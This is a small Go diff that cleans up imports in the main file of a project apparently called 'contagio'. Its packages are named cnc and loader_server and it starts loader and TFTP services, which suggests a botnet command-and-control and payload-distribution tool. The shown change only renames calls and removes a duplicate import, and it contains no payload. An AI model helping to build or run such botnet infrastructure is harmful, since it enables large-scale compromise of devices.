@@ -5,7 +5,6 @@ import (
 	"contagio/contagio/cnc"
 	"contagio/contagio/cnc/database"
 	"contagio/contagio/config"
-	"contagio/contagio/loader_server"
 	loader "contagio/contagio/loader_server"
 	"os"
 	"sync"
@@ -24,7 +23,7 @@ func main() {
 		if os.Args[1] == "docker_loader" {
 
 			wg.Add(1)
-			loader_server.GetArchs(&wg)
+			loader.GetArchs(&wg)
 
 			go loader.StartLoader(c)
 			go loader.StartTftp(c)
@@ -42,7 +41,7 @@ func main() {
 		database.InitDb(false)
 
 		wg.Add(1)
-		loader_server.GetArchs(&wg)
+		loader.GetArchs(&wg)
 
 		go loader.StartLoader(c)
 		go loader.StartTftp(c)
